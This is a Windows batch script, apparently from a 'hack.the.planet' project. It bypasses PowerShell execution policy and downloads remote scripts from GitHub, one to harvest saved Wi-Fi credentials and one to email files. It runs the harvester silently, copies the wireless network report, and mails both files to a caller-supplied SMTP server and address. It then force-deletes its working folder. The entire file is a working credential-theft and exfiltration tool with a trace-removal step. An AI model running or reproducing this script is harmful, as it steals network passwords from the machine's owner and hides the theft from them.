mkdir %TMP%\HackThePlanet
cd %TMP%\HackThePlanet 
powershell -executionpolicy bypass (New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/Opvolger/hack.the.planet/master/Wifi/GetWifiCreds.ps1\", \"GetWifiCreds.ps1\")
powershell -executionpolicy bypass (New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/Opvolger/hack.the.planet/master/MailMe.ps1\", \"MailMe.ps1\")
powershell -executionpolicy bypass -File .\GetWifiCreds.ps1 -ErrorAction SilentlyContinue > output.txt
call netsh wlan show wlanreport
call type C:\ProgramData\Microsoft\Windows\WlanReport\wlan-report-latest.html > wlan-report-latest.html
powershell -executionpolicy bypass -File MailMe.ps1 -smtpserver %1 -toaddress %2 -files output.txt,wlan-report-latest.html & cd .. 
cd ..
powershell -executionpolicy bypass Remove-Item -LiteralPath %TMP%\HackThePlanet -Force -Recurse
cd %~dp0